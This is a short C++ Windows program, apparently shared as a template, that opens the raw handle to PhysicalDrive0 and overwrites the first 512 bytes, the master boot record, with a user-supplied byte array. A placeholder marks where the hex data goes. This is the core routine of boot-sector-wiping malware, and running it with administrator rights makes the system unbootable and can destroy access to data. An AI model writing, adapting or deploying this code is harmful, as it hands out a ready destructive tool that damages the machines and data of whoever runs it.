#include <windows.h>

// Edit 07/02/2020, chaneged the name file to "Source", and added the cpp extension.

// Edit 01/01/2022, fixed shitty grammar from past

const unsigned char MasterBootRecord[] = { /*your hex data goes here*/ };

int CALLBACK WinMain(
    HINSTANCE hInstance, HINSTANCE hPrevInstance,
    LPSTR     lpCmdLine, int       nCmdShow
)
{
    // just open a handle to PhysicalDrive0, and we write our custom bootloader
    // https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew
    DWORD dwBytesWritten;
    HANDLE hDevice = CreateFileW(
        L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
        OPEN_EXISTING, 0, 0);

    WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0); // write the file to the handle
    CloseHandle(hDevice); // close the handle
}
